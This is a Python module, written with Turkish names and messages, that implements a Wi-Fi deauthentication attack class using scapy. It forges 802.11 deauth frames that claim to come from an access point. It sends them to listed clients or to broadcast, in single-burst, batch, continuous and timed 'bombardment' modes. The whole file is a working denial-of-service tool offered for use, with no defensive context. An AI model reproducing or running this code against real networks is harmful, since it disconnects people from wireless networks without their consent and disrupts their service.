#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""deauth saldırı modülü."""

import threading
import time

# pyrefly: ignore [missing-import]
from scapy.all import (
    Dot11,
    Dot11Deauth,
    RadioTap,
    sendp
)

from .yapilandirma import Renkler


class DeauthSaldirisi:
    """deauth saldırı sınıfı."""

    SIFIRLA = Renkler.SIFIRLA
    YESIL = Renkler.YESIL
    MAVI = Renkler.MAVI
    SARI = Renkler.SARI
    KIRMIZI = Renkler.KIRMIZI
    KALIN = Renkler.KALIN
    CYAN = Renkler.CYAN

    def __init__(self, arayuz):
        """deauth saldırısını başlatır."""
        self.arayuz = arayuz
        self.saldiri_aktif = False
        self.saldiri_ipligi = None

    def paket_olustur(self, hedef_mac, erisim_noktasi_mac):
        """deauth paketi oluşturur."""
        # deauth paket yapısı
        paket = (
            RadioTap() /
            Dot11(
                type=0,
                subtype=12,
                addr1=hedef_mac,
                addr2=erisim_noktasi_mac,
                addr3=erisim_noktasi_mac
            ) /
            Dot11Deauth(reason=7)
        )

        return paket

    def saldiri_baslat(self, hedef_mac, erisim_noktasi_mac, paket_sayisi=100, aralik=0.1):
        """deauth saldırısını başlatır."""
        if self.saldiri_aktif:
            print(
                f"{self.SARI}[!] zaten aktif bir saldırı var. "
                f"önce durdurun.{self.SIFIRLA}"
            )
            return

        self.saldiri_aktif = True

        # broadcast kontrolü
        if hedef_mac.lower() == "ff:ff:ff:ff:ff:ff":
            hedef_aciklama = "tüm istemciler (broadcast)"
        else:
            hedef_aciklama = hedef_mac.upper()

        print(
            f"\n{self.KIRMIZI}{self.KALIN}[*] deauth saldırısı başlatılıyor...{self.SIFIRLA}"
        )
        print(
            f"    {self.CYAN}hedef      : {self.SIFIRLA}{hedef_aciklama}"
        )
        print(
            f"    {self.CYAN}erişim noktası: {self.SIFIRLA}{erisim_noktasi_mac.upper()}"
        )
        print(
            f"    {self.CYAN}paket sayısı  : {self.SIFIRLA}{paket_sayisi}"
        )
        print(
            f"    {self.CYAN}aralık        : {self.SIFIRLA}{aralik}s"
        )

        self.saldiri_ipligi = threading.Thread(
            target=self._saldiri_dongusu,
            args=(hedef_mac, erisim_noktasi_mac, paket_sayisi, aralik),
            daemon=True,
            name="deauth_saldiri"
        )
        self.saldiri_ipligi.start()

    def _saldiri_dongusu(self, hedef_mac, erisim_noktasi_mac, paket_sayisi, aralik):
        """deauth paket gönderme döngüsü."""
        # paketi oluştur
        deauth_paketi = self.paket_olustur(hedef_mac, erisim_noktasi_mac)

        gonderilen = 0

        try:
            for i in range(paket_sayisi):
                if not self.saldiri_aktif:
                    break

                # paketi gönder
                sendp(
                    deauth_paketi,
                    iface=self.arayuz,
                    count=1,
                    inter=0,
                    verbose=False
                )

                gonderilen += 1

                # ilerleme durumu
                if gonderilen % 10 == 0:
                    print(
                        f"\r    {self.SARI}[»] gönderilen: "
                        f"{gonderilen}/{paket_sayisi} paket{self.SIFIRLA}",
                        end="",
                        flush=True
                    )

                time.sleep(aralik)

        except OSError as hata:
            print(
                f"\n{self.KIRMIZI}[!] paket gönderme hatası: {hata}{self.SIFIRLA}"
            )
        except Exception as hata:
            print(
                f"\n{self.KIRMIZI}[!] beklenmeyen hata: {hata}{self.SIFIRLA}"
            )
        finally:
            self.saldiri_aktif = False
            print(
                f"\n    {self.YESIL}[✓] saldırı tamamlandı. "
                f"toplam {gonderilen} paket gönderildi.{self.SIFIRLA}\n"
            )

    def saldiri_durdur(self):
        """aktif saldırıyı durdurur."""
        if not self.saldiri_aktif:
            print(f"{self.SARI}[!] aktif bir saldırı yok.{self.SIFIRLA}")
            return

        self.saldiri_aktif = False

        if self.saldiri_ipligi and self.saldiri_ipligi.is_alive():
            self.saldiri_ipligi.join(timeout=5)

        print(f"\n{self.SARI}[*] saldırı durduruldu.{self.SIFIRLA}")

    def toplu_deauth(self, erisim_noktasi_mac, istemci_listesi, paket_sayisi=50):
        """birden fazla istemciye deauth gönderir."""
        if not istemci_listesi:
            print(f"{self.SARI}[!] istemci listesi boş.{self.SIFIRLA}")
            return

        toplam_istemci = len(istemci_listesi)

        print(
            f"\n{self.KIRMIZI}{self.KALIN}[*] toplu deauth saldırısı başlatılıyor...{self.SIFIRLA}"
        )
        print(
            f"    {self.CYAN}erişim noktası : {self.SIFIRLA}{erisim_noktasi_mac.upper()}"
        )
        print(
            f"    {self.CYAN}istemci sayısı : {self.SIFIRLA}{toplam_istemci}"
        )
        print(
            f"    {self.CYAN}istemci başına : {self.SIFIRLA}{paket_sayisi} paket"
        )

        self.saldiri_aktif = True
        toplam_gonderilen = 0

        try:
            for sira, istemci_mac in enumerate(istemci_listesi, 1):
                if not self.saldiri_aktif:
                    break

                print(
                    f"\n    {self.MAVI}[{sira}/{toplam_istemci}] "
                    f"hedef: {istemci_mac.upper()}{self.SIFIRLA}"
                )

                deauth_paketi = self.paket_olustur(istemci_mac, erisim_noktasi_mac)

                for i in range(paket_sayisi):
                    if not self.saldiri_aktif:
                        break

                    sendp(
                        deauth_paketi,
                        iface=self.arayuz,
                        count=1,
                        inter=0,
                        verbose=False
                    )

                    toplam_gonderilen += 1

                    # ilerleme durumu
                    if (i + 1) % 10 == 0:
                        print(
                            f"\r      {self.SARI}[»] gönderilen: "
                            f"{i + 1}/{paket_sayisi}{self.SIFIRLA}",
                            end="",
                            flush=True
                        )

                    time.sleep(0.05)

                print()

        except Exception as hata:
            print(
                f"\n{self.KIRMIZI}[!] toplu saldırı hatası: {hata}{self.SIFIRLA}"
            )
        finally:
            self.saldiri_aktif = False
            print(
                f"\n    {self.YESIL}[✓] toplu saldırı tamamlandı. "
                f"toplam {toplam_gonderilen} paket gönderildi.{self.SIFIRLA}\n"
            )

    def surekli_deauth_baslat(self, hedef_mac, erisim_noktasi_mac, aralik=0.05):
        """sürekli deauth saldırısı başlatır."""
        if self.saldiri_aktif:
            print(
                f"{self.SARI}[!] zaten aktif bir saldırı var. "
                f"önce durdurun.{self.SIFIRLA}"
            )
            return

        self.saldiri_aktif = True

        if hedef_mac.lower() == "ff:ff:ff:ff:ff:ff":
            hedef_aciklama = "tüm istemciler (broadcast)"
        else:
            hedef_aciklama = hedef_mac.upper()

        print(
            f"\n{self.KIRMIZI}{self.KALIN}[*] sürekli deauth saldırısı başlatılıyor...{self.SIFIRLA}"
        )
        print(
            f"    {self.CYAN}hedef      : {self.SIFIRLA}{hedef_aciklama}"
        )
        print(
            f"    {self.CYAN}erişim noktası: {self.SIFIRLA}{erisim_noktasi_mac.upper()}"
        )
        print(
            f"    {self.CYAN}mod           : {self.SIFIRLA}sürekli (durdurulana kadar)"
        )

        self.saldiri_ipligi = threading.Thread(
            target=self._surekli_saldiri_dongusu,
            args=(hedef_mac, erisim_noktasi_mac, aralik),
            daemon=True,
            name="surekli_deauth"
        )
        self.saldiri_ipligi.start()

    def _surekli_saldiri_dongusu(self, hedef_mac, erisim_noktasi_mac, aralik):
        """sürekli deauth gönderme döngüsü."""
        deauth_paketi = self.paket_olustur(hedef_mac, erisim_noktasi_mac)
        gonderilen = 0

        try:
            while self.saldiri_aktif:
                sendp(
                    deauth_paketi,
                    iface=self.arayuz,
                    count=1,
                    inter=0,
                    verbose=False
                )
                gonderilen += 1

                # ilerleme durumu
                if gonderilen % 50 == 0:
                    print(
                        f"\r    {self.SARI}[»] sürekli deauth: "
                        f"{gonderilen} paket gönderildi{self.SIFIRLA}",
                        end="",
                        flush=True
                    )

                time.sleep(aralik)

        except OSError:
            pass
        except Exception:
            pass
        finally:
            self.saldiri_aktif = False
            print(
                f"\n    {self.YESIL}[✓] sürekli deauth durduruldu. "
                f"toplam {gonderilen} paket gönderildi.{self.SIFIRLA}"
            )

    def toplu_surekli_deauth_baslat(self, erisim_noktasi_mac, istemci_listesi, aralik=0.05):
        """birden fazla istemciye sürekli deauth başlatır."""
        if self.saldiri_aktif:
            print(
                f"{self.SARI}[!] zaten aktif bir saldırı var. "
                f"önce durdurun.{self.SIFIRLA}"
            )
            return

        if not istemci_listesi:
            # istemci yoksa broadcast kullan
            self.surekli_deauth_baslat('ff:ff:ff:ff:ff:ff', erisim_noktasi_mac, aralik)
            return

        self.saldiri_aktif = True

        print(
            f"\n{self.KIRMIZI}{self.KALIN}[*] toplu sürekli deauth başlatılıyor "
            f"({len(istemci_listesi)} istemci)...{self.SIFIRLA}"
        )

        # istemci paketlerini oluştur
        paketler = []
        for istemci_mac in istemci_listesi:
            paketler.append(self.paket_olustur(istemci_mac, erisim_noktasi_mac))

        # broadcast ekle
        paketler.append(self.paket_olustur('ff:ff:ff:ff:ff:ff', erisim_noktasi_mac))

        def toplu_surekli_dongu():
            gonderilen = 0
            try:
                while self.saldiri_aktif:
                    for paket in paketler:
                        if not self.saldiri_aktif:
                            break
                        sendp(paket, iface=self.arayuz, count=1, inter=0, verbose=False)
                        gonderilen += 1
                        time.sleep(aralik)

                    if gonderilen % 100 == 0:
                        print(
                            f"\r    {self.SARI}[»] sürekli deauth: "
                            f"{gonderilen} paket gönderildi{self.SIFIRLA}",
                            end="",
                            flush=True
                        )
            except Exception:
                pass
            finally:
                self.saldiri_aktif = False
                print(
                    f"\n    {self.YESIL}[✓] toplu sürekli deauth durduruldu. "
                    f"toplam {gonderilen} paket.{self.SIFIRLA}"
                )

        self.saldiri_ipligi = threading.Thread(
            target=toplu_surekli_dongu,
            daemon=True,
            name="toplu_surekli_deauth"
        )
        self.saldiri_ipligi.start()

    def yogun_deauth_gonder(self, erisim_noktasi_mac, istemci_listesi=None, sure=15, aralik=0.02):
        """yoğun deauth bombardımanı gönderir."""
        # paketleri hazırla
        paketler = []

        # broadcast paketi ekle
        paketler.append(self.paket_olustur('ff:ff:ff:ff:ff:ff', erisim_noktasi_mac))

        # istemci paketlerini ekle
        if istemci_listesi:
            for istemci_mac in istemci_listesi:
                if istemci_mac.lower() != 'ff:ff:ff:ff:ff:ff':
                    paketler.append(self.paket_olustur(istemci_mac, erisim_noktasi_mac))

        toplam_istemci = len(paketler)

        print(
            f"\n{self.KIRMIZI}{self.KALIN}[*] yoğun deauth bombardımanı başlatılıyor...{self.SIFIRLA}"
        )
        print(
            f"    {self.CYAN}hedef ap      : {self.SIFIRLA}{erisim_noktasi_mac.upper()}"
        )
        print(
            f"    {self.CYAN}hedef sayısı  : {self.SIFIRLA}{toplam_istemci} (broadcast dahil)"
        )
        print(
            f"    {self.CYAN}süre          : {self.SIFIRLA}{sure} saniye"
        )
        print(
            f"    {self.CYAN}aralık        : {self.SIFIRLA}{aralik}s (yoğun mod)"
        )

        gonderilen = 0
        baslangic = time.time()

        try:
            while (time.time() - baslangic) < sure:
                for paket in paketler:
                    if (time.time() - baslangic) >= sure:
                        break

                    sendp(paket, iface=self.arayuz, count=1, inter=0, verbose=False)
                    gonderilen += 1

                    # ilerleme durumu
                    if gonderilen % 100 == 0:
                        gecen = time.time() - baslangic
                        kalan = max(0, sure - gecen)
                        print(
                            f"\r    {self.SARI}[»] yoğun deauth: "
                            f"{gonderilen} paket | kalan: {kalan:.0f}s{self.SIFIRLA}",
                            end="",
                            flush=True
                        )

                    time.sleep(aralik)

        except OSError as hata:
            print(
                f"\n{self.KIRMIZI}[!] deauth gönderme hatası: {hata}{self.SIFIRLA}"
            )
        except Exception as hata:
            print(
                f"\n{self.KIRMIZI}[!] beklenmeyen hata: {hata}{self.SIFIRLA}"
            )

        print(
            f"\n    {self.YESIL}[✓] yoğun deauth tamamlandı. "
            f"toplam {gonderilen} paket gönderildi ({sure}s).{self.SIFIRLA}\n"
        )
